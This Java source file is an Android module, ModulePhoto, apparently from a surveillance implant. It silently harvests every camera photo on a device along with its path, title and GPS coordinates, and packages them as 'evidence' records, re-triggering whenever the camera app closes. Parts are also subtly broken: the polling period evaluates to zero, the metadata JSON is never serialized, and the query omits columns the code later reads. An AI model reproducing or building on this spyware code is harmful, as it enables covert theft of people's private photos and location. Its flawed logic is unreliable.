package com.android.dvci.module.task;

import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import android.provider.MediaStore;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.AutoFile;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.BaseModule;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;
import java.util.concurrent.Semaphore;

/**
 * Created by zeno on 29/01/15.
 */
public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {

	private static final String TAG = "ModulePhoto"; //$NON-NLS-1$
	private static final int LOG_PHOTO_VERSION = 2015012601;

	Semaphore semaphorePhoto = new Semaphore(1);
	private Markup markupPhoto;
	private long lastTimestamp = 0;

	@Override
	protected boolean parse(ConfModule conf) {
		setPeriod(3600 * 000);
		return true;
	}

	@Override
	protected void actualGo() {
		fetchPhotos();

	}

	@Override
	protected void actualStart() {
		//https://stackoverflow.com/questions/2169649/get-pick-an-image-from-androids-built-in-gallery-app-programmatically
		//MediaStore.Images.Media.query()

		markupPhoto = new Markup(this);
		fetchPhotos();
		ListenerProcess.self().attach(this);
	}


	@Override
	protected void actualStop() {
		ListenerProcess.self().detach(this);
	}


	private void fetchPhotos() {
		if (!semaphorePhoto.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchPhotos), still fetching, return");
			}
			return;
		}
		try {
			lastTimestamp = markupPhoto.unserialize(new Long(0));
			long newtimestamp = getCameraPhoto(lastTimestamp);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
			}
			markupPhoto.serialize(newtimestamp);
		} finally {
			semaphorePhoto.release();
		}
	}

	private long getCameraPhoto(long lastTimestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCameraPhoto)");
		}
		Context context = Status.getAppContext();

		String[] places = new String[]{"/DCIM/Camera", "/DCIM/100MEDIA"};
		String environment = Environment.getExternalStorageDirectory().toString();


		for (String place : places) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCameraPhoto) try: " + place);
			}
			String cameraBucketName = environment + place;

			String bucketID = getBucketId(cameraBucketName);

			long bucketlast = getCameraImages(context, bucketID, new ImageVisitor());
			lastTimestamp = Math.max(lastTimestamp, bucketlast);
		}

		return lastTimestamp;
	}

	@Override
	public int notification(ProcessInfo b) {
		if (b.processInfo.contains("camera") && b.status == ProcessStatus.STOP) {
			fetchPhotos();
		}
		return 0;
	}


	class ImageVisitor {
		long visitor(Cursor cursor) {
			final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
			final int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
			final int titleColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.TITLE);
			final int mimeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);


			final int latColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LATITUDE);
			final int lonColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LONGITUDE);

			long last = 0;

			final String path = cursor.getString(dataColumn);
			final Date date = new Date(cursor.getLong(dateColumn) * 1000);
			final String title = cursor.getString(titleColumn);
			final String mime = cursor.getString(mimeColumn);

			final String lat = cursor.getString(latColumn);
			final String lon = cursor.getString(lonColumn);

			AutoFile file = new AutoFile(path);

			byte[] jpeg = file.read();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (visitor), " + path);
			}

			EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon), jpeg, date);

			last = date.getTime();
			return last;
		}
	}

	/**
	 * Matches code in MediaProvider.computeBucketValues. Should be a common
	 * function.
	 */
	public static String getBucketId(String path) {
		return String.valueOf(path.toLowerCase().hashCode());
	}

	public static long getCameraImages(Context context, String place, ImageVisitor visitor) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCameraImages) place: " + place);
		}

		final String[] projection = {MediaStore.Images.Media.DATA};
		final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
		final String[] selectionArgs = {place};
		final Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
				projection,
				selection,
				selectionArgs,
				null);

		long lasttimestamp = 0;

		if (cursor.moveToFirst()) {
			do {
				long last = visitor.visitor(cursor);
				lasttimestamp = Math.max(last, lasttimestamp);

			} while (cursor.moveToNext());
		}
		cursor.close();
		return lasttimestamp;
	}


	private byte[] getAdditionalData(String title, String path, String mime, String lat, String lon) {

		String json = "";

		JSONObject data = new JSONObject();
		JSONObject place = new JSONObject();
		JSONObject main = new JSONObject();
		try {
			data.put("program", "photo");
			data.put("path", path);

			if (!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon)) {
				place.put("lat", lat);
				place.put("lon", lon);
			}

			main.put("data", data);
			main.put("description", title);
			main.put("device", "android");
			main.put("mime", mime);

		} catch (JSONException e) {
			e.printStackTrace();
		}

		byte[] jsonByte = WChar.getBytes(json);

		int tlen = jsonByte.length + 4;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);
		databuffer.writeInt(LOG_PHOTO_VERSION); // version
		databuffer.write(jsonByte);

		return additionalData;
	}

}
